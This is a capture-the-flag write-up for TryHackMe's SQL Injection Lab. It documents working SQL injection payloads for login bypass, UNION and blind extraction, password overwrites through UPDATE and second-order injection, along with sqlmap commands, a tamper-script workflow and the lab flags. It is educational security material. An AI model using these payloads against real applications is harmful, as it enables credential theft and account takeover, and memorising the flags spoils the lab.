# [SQL Injection Lab](https://tryhackme.com/room/sqlilab): TryHackMe

_Understand how SQL injection attacks work and how to exploit this vulnerability_


## Task 1 — Introduction

The lab is a standalone SQL Injection Sandbox, deployed at `http://<machine_ip>:5000`. Two helpful toggles sit in the top-right corner:
- **Show Query** — displays the actual SQL query being executed live, as you type input
- **Guidance** — displays a built-in tutorial per challenge

A **Downloads** page (`/downloads/`) hosts scripts referenced throughout the room (exploit scripts, decoders, etc.).

The room is split into two tracks:
- **Track: Introduction to SQL Injection** — SQL Injection 1–5, building up core technique
- **Track: Vulnerable Startup** — a themed employee-management app with progressively harder, more realistic vulnerabilities (Broken Authentication 1–3, Vulnerable Notes, Change Password, Book Title 1–2)

_[Screenshot: SQL Injection Sandbox landing page, showing both tracks]_

---

## Track: Introduction to SQL Injection

### Task 2 — Part 1: Dynamic Queries & Comment Syntax

Applications need **dynamic SQL queries** to display content based on user-controlled conditions. The common mistake: developers concatenate user input directly into the query string instead of validating/parameterizing it. Example (PHP):
```php
$query = "SELECT * FROM users WHERE username='" + $_POST["user"] + "' AND password= '" + $_POST["password"] + "'";
```
If an attacker supplies `' OR 1=1-- -` as the username, the executed query becomes:
```sql
SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = ''
```
Since `1=1` is always true, every user is returned — and since most applications process the *first* returned row, the attacker is logged in as whichever account comes first (often admin).

**A note on the `-- -` trick**: MySQL's `--` comment style requires the second dash to be followed by at least one whitespace/control character to actually start a comment — a bare `--` with nothing after it can fail to comment out the rest of the query. Using `-- -` (dash, dash, space, dash) guarantees that whitespace requirement is met, and it survives URL-encoding (`--%20-`) cleanly too — which is why it shows up as the standard pattern throughout this room rather than a plain `--`.

#### SQL Injection 1: Input Box Non-String
Query: `SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=10 AND password = 'ce5ca67...'`. The `profileID` parameter expects an **integer**, so no quote-breaking is needed — a bare always-true condition works directly:
```
1 or 1=1-- -
```
_[Screenshot: login form with the payload entered, plus the Show Query panel confirming the injected query]_

**Result**: logged in, password field could be anything once the comment landed — everything after `-- -` was ignored regardless of what was typed there.
**Flag**: `THM{dccea429d73d4a6b4f117ac64724f460}`

#### SQL Injection 2: Input Box String
Same query, but `profileID` is wrapped in quotes (`profileID='10'`) — so the injection has to close the string first:
```
1' or '1'='1'-- -
```
**Flag**: `THM{356e9de6016b9ac34e02df99a5f755ba}`

#### SQL Injection 3 & 4 — Client-Side Validation
Both challenges add JavaScript input validation restricting fields to `a-z`, `A-Z`, `0-9` only. **Key point**: client-side validation is a UX feature, not a security control — the user fully controls their own browser and what it actually sends, so this is trivially bypassed.

#### SQL Injection 3: URL Injection
This form submits via **GET**, so the JS validation can be skipped entirely by navigating directly to a crafted URL:
```
http://<ip>:5000/sesqli3/login?profileID=-1' or 1=1-- -&password=a
```
The browser auto-URL-encodes this (`%27` = `'`, `%20` = space).
_[Screenshot: the crafted URL in the address bar + the resulting bypass]_
**Flag**: `THM{645eab5d34f81981f5705de54e8a9c36}`

#### SQL Injection 4: POST Injection
This form submits via **POST**, so the JS block has to be bypassed differently — intercepting the request with **Burp Suite** and editing the `profileID` field directly in the raw request body before forwarding.

**What tripped this up initially**: using a bare `--` (no trailing space/character) left a stray `'` from the original query template right after the comment marker, breaking it — same root cause explained in Task 2's note above. Fixing it to `-1' or 1=1-- -` (trailing space) resolved it.

Workflow used:
1. Intercepted the POST request in Burp.
2. Edited the `profileID` field in the raw request body to `-1' or 1=1-- `.
3. Forwarded the request — received a session cookie in the response.
4. Sent that cookie forward (via Repeater) to `GET /sesqli4/home`.
5. Found the flag embedded directly in the rendered HTML response.

_[Screenshot: Burp Repeater showing the GET /home request/response with the flag visible in the HTML]_
**Flag**: `THM{727334fd0f0ea1b836a8d443f09dc8eb}`

---

### Task 3 — Part 2: UPDATE Statement Injection

SQL injection in an **UPDATE** statement is particularly dangerous since it can *modify* records, not just read them. The target: an employee "Edit Profile" page updating `nickName` and `email`.

**Confirming the vulnerability**: injecting `asd',nickName='test',email='hacked` into the `nickName` field — if *only* `nickName` updates, the column names are right and the injection breaks out of one field only. If *both* `nickName` and `email` update from a single-field injection, the underlying query is almost certainly:
```sql
UPDATE <table> SET nickName='name', email='email' WHERE <condition>
```

**Identifying the database engine** — ask it to identify itself:
| Engine | Payload |
|---|---|
| MySQL / MSSQL | `',nickName=@@version,email='` |
| Oracle | `',nickName=(SELECT banner FROM v$version),email='` |
| SQLite | `',nickName=sqlite_version(),email='` |

**Enumerating tables (SQLite)** — `sqlite_master` is SQLite's equivalent of `information_schema`:
```sql
',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
```

**Enumerating columns**:
```sql
',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='<table>'),email='
```

**Extracting data**:
```sql
',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable),email='
```

**Writing data back (once a hash algorithm is identified and a new hash generated)**:
```sql
', password='<new_hash>' WHERE name='Admin'-- -
```

#### SQL Injection 5: UPDATE Statement — walkthrough
Logged in with the given credentials (`profileID: 10`, `password: toor`) → landed on Francois's profile. Confirmed the edit form was vulnerable using the `nickName`/`email` test payload above.

**Enumeration performed:**
1. **DB version**: `sqlite_version()` → confirmed SQLite 3.31.1
2. **Tables**: found two — `usertable` and `secrets` (an extra table beyond what the room's own walkthrough showed, since lab instances can seed slightly different data)
3. **`usertable` structure**:
   ```sql
   CREATE TABLE `usertable` ( `UID` integer primary key, `name` varchar(30) NOT NULL, `profileID` varchar(20) DEFAULT NULL, `salary` int(9) DEFAULT NULL, `passportNr` varchar(20) DEFAULT NULL, `email` varchar(300) DEFAULT NULL, `nickName` varchar(300) DEFAULT NULL, `password` varchar(300) DEFAULT NULL )
   ```
4. **`secrets` structure**: `CREATE TABLE secrets ( id integer primary key, author integer not null, secret text not null )`
5. **Dumped `usertable`** via `group_concat()` — six users total (`Francois`, `Michandre`, `Colette`, `Phillip`, `Ivan`, and `Admin` at ID `99`). The Admin account sitting at a deliberately out-of-sequence ID (99, vs. 10–14 for regular users) is a common real-world pattern — it avoids collisions with auto-incrementing normal user IDs.
6. **Hash identification**: ran Francois's hash through a hash-identifier tool → confirmed **SHA-256**.
   _[Screenshot: hash-identifier output confirming SHA-256]_
7. **Cracked Francois's hash** via an online tool — recovered `toor`, which matched the login password already used, confirming the crack was correct.
8. **Generated a new SHA-256 hash** via CyberChef for a chosen password.
   _[Screenshot: CyberChef SHA2-256 operation generating the new hash]_
9. **Updated Admin's password** using the UPDATE injection, logged in as Admin, and found the flag inside the `secrets` table.

_[Screenshot: Francois's profile showing the dumped usertable data in the nickName field]_
_[Screenshot: logged in as Admin, secrets table content showing the flag]_

**Flag**: `THM{b3a540515dbd9847c29cffa1bef1edfb}`

---

## Track: Vulnerable Startup

### Task 4 — Broken Authentication (challenge1)
Goal: bypass the login to retrieve the flag.

Tried registering `admin:admin` first → got "username already exists" (confirming the account exists, worth noting for later tasks). Switched to the classic bypass:
```
1' or 1=1-- -
```
Logged in as "Unknown" (the first row returned, with no real identity attached).
**Flag**: `THM{f35f47dcd9d596f0d3860d14cd4c68ec}`

---

### Task 5 — Broken Authentication 2 (challenge2)
Goal: dump *all* passwords without using blind injection.

**Where results surface**: after logging in, the current username is displayed top-right — and the same data lands in the **Flask session cookie**, decodable via dev tools (F12 → Storage) or a tool like [flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi).

**UNION-based approach**: the login query returns two columns (`id`, `username`). First, column count must be confirmed by incrementing `NULL`s:
```
1' UNION SELECT NULL-- -
1' UNION SELECT NULL, NULL-- -
```
...until the login succeeds — confirming the real query selects 2 columns. With that known:
```
' UNION SELECT 1,2-- -
```
...logs in with "2" literally displayed as the username, confirming full control of that output field. From there, swap in a real extraction query:
```
' UNION SELECT 1,group_concat(password) FROM users-- -
```

**Walkthrough**: logged in as admin via `1' or 1=1-- -` first to confirm the base vulnerability still works, then used the UNION payload above as the username. Decoded the resulting session cookie (via flask-session.cgi) and confirmed the full password dump was present there as well as directly on the page.

_[Screenshot: decoded session cookie showing the dumped password list]_

**Flag**: `THM{fb381dfee71ef9c31b93625ad540c9fa}`

---

### Task 6 — Broken Authentication 3: Blind Injection (challenge3)
Goal: this time neither the page content nor the session cookie leaks data — the only signal is whether login succeeds or fails. **Boolean-based blind** SQLi via `SUBSTR()` is required.

**Building the technique:**
- `SUBSTR(string, start, length)` extracts part of a string — e.g. `SUBSTR("THM{Blind}",1,1)` → `T`.
- Target string: `(SELECT password FROM users LIMIT 0,1)` — `LIMIT <offset>,<count>` picks exactly one row (here, the first).
- Comparing characters directly (`= 'T'`) is unreliable because the app lowercases input before it reaches the query — breaking exact-case string comparison. **Fix**: supply the guessed character as its **hex value**, cast to SQLite's TEXT type, which sidesteps the lowercasing entirely:
  ```sql
  SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)
  ```
  (`X'54'` = hex for ASCII `T`.)
- Fitted into the login form:
  ```
  admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -
  ```
  A successful (302 redirect) login = correct character guessed at that position.
- **Password length** needs to be found first, the same way:
  ```
  admin' AND length((SELECT password from users where username='admin'))==37-- -
  ```

**Using the provided exploit script** (`challenge3-exploit.py`): this automates exactly the above, one character and one position at a time.
1. Download it: `wget http://<ip>:5000/view/challenge3/challenge3-exploit.py -O exploit.py`
2. Set `password_len` inside the script to the value found via the `length()` query above.
3. Install dependencies: `pip install requests`
4. Run it against the target: `python3 exploit.py <ip>:5000`

It loops through every position (1 → `password_len`), and for each position tries every lowercase letter, uppercase letter, digit, and `{`/`}` — converting each guess to hex, sending it as the `username` POST field, and checking whether the response contains `"Invalid"`. No `"Invalid"` = correct character confirmed, append it, move to the next position. It's intentionally brute-force and sequential — not fast, but it's meant to illustrate the mechanics before reaching for a proper tool.

**Automating with sqlmap** — the faster real-world path:
```bash
sqlmap -u "http://<ip>:5000/challenge3/login" \
  --data="username=admin&password=admin" \
  --level=5 --risk=3 --dbms=sqlite --technique=B \
  -p username --not-string="Invalid" --dump
```
Notes from running this live:
- The room's bare command (without `-p username` / `--not-string`) failed to detect the injection reliably — sqlmap's default heuristics didn't recognize `username`/`password` as dynamic parameters on their own. Explicitly targeting `-p username` and giving sqlmap a clear true/false oracle via `--not-string="Invalid"` was what got it working.
- Even once working, this was **slow** — multiple connection timeouts occurred over the course of the dump, which is expected for boolean-based blind extraction (every single character needs its own request cycle).

_[Screenshot: sqlmap terminal output showing the confirmed injection point and the retrieved flag]_

**Flag**: `THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}`

---

### Task 7 — Vulnerable Notes (challenge4)
Goal: the login form is now fixed — find the vulnerability in the new **Notes** feature instead.

**On parameterized queries** (why the insert/registration functions here are *not* vulnerable):

> **The notes function is not directly vulnerable, as the function to insert notes is safe because it uses parameterized queries. With parameterized queries, the SQL statement is specified first with placeholders (?) for the parameters. Then the user input is passed into each parameter of the query later. Parameterized queries allow the database to distinguish between code and data, regardless of the input.**

**In plainer terms**: think of a parameterized query like a form letter with blanks to fill in — `"Dear ___, your balance is ___."` No matter what someone writes in those blanks, it's just going in as the *content* of the letter. It can never rewrite the letter's sentence structure itself. A parameterized SQL query works the same way: the query's shape (`INSERT INTO notes (username, title, note) VALUES (?, ?, ?)`) is locked in first, and whatever the user types just slots into those `?` placeholders as pure data — it's structurally impossible for it to be reinterpreted as part of the SQL command, no matter what characters are in it.

> ⚠️ Important nuance the room makes explicit: parameterized queries stop *injection*, but they don't stop **malicious data from being stored**. If an app accepts a harmful username and stores it via a parameterized `INSERT`, that data is safely stored *as data* — but if a *different*, unsafe query later reads and concatenates that same stored value, the stored data becomes a live injection point at that point instead. This is exactly what happens in this challenge.

**The actual vulnerability**: the query that *fetches* notes concatenates the username directly:
```sql
SELECT title, note FROM notes WHERE username = '" + username + "'
```
So a malicious *registration* becomes a live injection the moment that user visits their own Notes page — a classic **second-order (stored) SQL injection**.

**Walkthrough:**
1. Registered normally (`angie:angie123`) to confirm the Notes feature itself.
2. Registered a new account with username `' union select 1,2'` → logging in and visiting Notes confirmed the injection (column 1 = note title, column 2 = note body).
3. Registered with username `' union select 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%''` → enumerated tables via the Notes page.
4. Registered with username `' union select 1,group_concat(password) from users'` → logged in, visited Notes, found the flag.

_[Screenshot: Notes page showing the dumped password list as a "note"]_

**Flag**: `THM{4644c7e157fd5498e7e4026c89650814}`

#### Automating with sqlmap (tamper script) — reference notes
A plain sqlmap run fails here because the injection point (registration) and the vulnerable output (Notes page) are two *different* requests — sqlmap needs to register a user, log in, *then* visit Notes, all per payload attempt. This requires a custom **tamper script**:

1. **Write the tamper script** (e.g. `so-tamper.py`) with three functions:
   - `create_account(payload)` — POSTs the sqlmap payload as the username to `/signup`.
   - `login(payload)` — logs in as that same user, returns the Flask session cookie.
   - `tamper(payload, **kwargs)` — the function sqlmap actually calls per attempt: creates the account, logs in, and injects the resulting session cookie into the request headers so the *next* request (to the Notes page) is authenticated as the malicious user.
2. **Add an empty `__init__.py`** in the same folder — required for sqlmap to load the tamper script as a module.
3. **Edit the `address` and `password` variables** inside the script to match the target.
4. **Run sqlmap** pointing at the registration endpoint, with `--second-url` pointing at the page that actually triggers the stored injection:
   ```bash
   sqlmap --tamper so-tamper.py \
     --url http://<ip>:5000/challenge4/signup \
     --data "username=admin&password=asd" \
     --second-url http://<ip>:5000/challenge4/notes \
     -p username --dbms sqlite --technique=U --no-cast
   ```
   - `--second-url` — tells sqlmap where to check for the injection's actual effect (since the vulnerable query isn't on the request URL itself).
   - `--no-cast` — turns off sqlmap's default payload-casting; without this, dumping tables can fail/behave oddly on SQLite.
5. When prompted: say **no** to following 302 redirects, **yes** to continuing if a WAF/IPS is suspected, **no** to merging cookies across future requests, and **no** to reducing requests.
6. To dump a specific table once the injection is confirmed:
   ```bash
   sqlmap --tamper tamper/so-tamper.py \
     --url http://<ip>:5000/challenge4/signup \
     --data "username=admin&password=asd" \
     --second-url http://<ip>:5000/challenge4/notes \
     -p username --dbms=sqlite --technique=U --no-cast -T users --dump
   ```
   This is noisy (creates many accounts in the process) and output gets trimmed in the console for large tables — but the full dump is always written to a local dump file, which is where the flag ends up.

---

### Task 8 — Change Password (challenge5)
Goal: the Notes vulnerability is patched; a new **Change Password** function is vulnerable instead — exploit it to gain access to the admin account.

**The flaw**: the password itself is safely parameterized, but the *username* used in the `WHERE` clause is fetched from the session and concatenated directly:
```sql
UPDATE users SET password = ? WHERE username = '" + username + "'
```
The developer assumed the username was "safe" since it came from the database rather than directly from user input — but that username was *originally* set by the user at registration, so it's attacker-controlled all the way back.

**Exploit**: register a user named `admin'-- -`. When *that* account changes its own password, the query becomes:
```sql
UPDATE users SET password = ? WHERE username = 'admin'-- -'
```
The comment strips the rest of the original condition — so the password update actually lands on the real **admin** account instead of the attacker's own.

**Walkthrough:**
1. Registered `admin'-- -` / `pass` → logged in as that user.
2. Went to Profile → Change Password → updated password to `pass1`.
3. Logged out, logged back in as `admin` (the real account) with the new password `pass1`.
4. Found the flag.

_[Screenshot: Change Password page showing the flag after successful exploitation]_

**Flag**: `THM{cd5c4f197d708fda06979f13d8081013}`

---

### Task 9 — Book Title (challenge6)
Goal: a new book-search function is vulnerable — exploit it to find the flag.

**The flaw**: user input is concatenated directly into a `LIKE` clause:
```sql
SELECT * from books WHERE id = (SELECT id FROM books WHERE title like '" + title + "%')
```
Closing the string and the `LIKE` wildcard with `') or 1=1-- -` dumps every book.

**Walkthrough:**
1. Registered/logged in (`angie:angie123`), followed the in-app link to the search page.
2. Confirmed the vulnerability: `') or 1=1-- -` → returned every book in the database (not the flag itself, just confirmation).
3. Escalated to a UNION-based extraction (matching the query's 4-column structure):
   ```
   ') UNION SELECT 1,2,3,group_concat(password) FROM users-- -
   ```

_[Screenshot: search results showing the dumped password list in the Author field]_

**Flag**: `THM{27f8f7ce3c05ca8d6553bc5948a89210}`

---

### Task 10 — Book Title 2 (challenge7)
Goal: same book-search feature, but now it's a **two-query, second-order** setup — one query fetches a book's ID, a second (also vulnerable) query then uses that ID:
```python
bid = db.sql_query(f"SELECT id FROM books WHERE title like '{title}%'", one=True)
if bid:
    query = f"SELECT * FROM books WHERE id = '{bid['id']}'"
```
Both queries are independently injectable — this *could* be exploited blind, but since the second query is also vulnerable, it's far simpler (and quieter) to chain a UNION through both.

**Building the payload step by step:**
1. First, force the initial query to return **zero real rows** so only injected data flows into the second query — any non-matching search term does this (or an explicit `' union select 'STRING`).
2. `' union select 'STRING` → confirms the first query's output (`STRING%`) is what feeds directly into the second query's `WHERE id = '...'` clause.
3. The app appends a `%` wildcard automatically — so the injected value needs to comment that out too:
   ```
   ' union select '1'-- -
   ```
   This returned book ID 1's real data, confirming full control over the second query's `id` value.
4. To get the *second* query to run its own UNION (rather than just supplying a literal ID), the string opened by the first UNION needs to be **closed and escaped** — doubling the single quote (`''`) rather than just closing it, so the second query's own string literal terminates correctly:
   ```
   ' union select '-1''union select 1,2,3,4-- -
   ```

**Walkthrough:**
1. Logged in (`angie:angie123`), navigated to the book search page.
2. `' union select 'STRING` → confirmed query chaining (`title like '' union select 'STRING%'` → `id = 'STRING%'`).
3. `' union select '1'-- -` → confirmed full ID control (returned book ID 1's actual data).
4. `' union select '-1''union select 1,2,3,4-- -` → confirmed full control of the *second* query's column output.
5. Final extraction payload: `' union select '-1'' union select 1,2,group_concat(password),4 from users-- -`

_[Screenshot: book search results showing the dumped password list]_

**Flag**: `THM{183526c1843c09809695a9979a672f09}`

---

## Key Takeaways
- **Comment syntax matters**: `-- ` (with trailing space/character) is more reliable than a bare `--`, especially in MySQL and when a stray `'` sits right after your injection point.
- **Client-side validation is not security** — any JS character restriction is bypassable via Burp, direct URL manipulation, or disabling JS entirely.
- **UPDATE-statement injection** can both *read* (routing subquery output into a displayed field like `nickName`) and *write* (overwriting another user's password) — genuinely more dangerous than read-only SQLi.
- **Second-order (stored) SQL injection** is sneaky: a perfectly safe parameterized `INSERT` can still store a malicious payload that detonates later, the moment a *different*, unsafe query reads that same data back.
- **Parameterized queries only protect the query they're used in** — every query touching user-influenced data needs them, not just the one directly receiving form input.
- **Boolean-based blind SQLi** via `SUBSTR()` + hex-encoded character comparison is the standard technique when case-sensitivity or filtering breaks direct string comparison.
- **sqlmap tamper scripts** extend automated exploitation to multi-step/second-order vulnerabilities that a standard sqlmap run can't reach on its own.
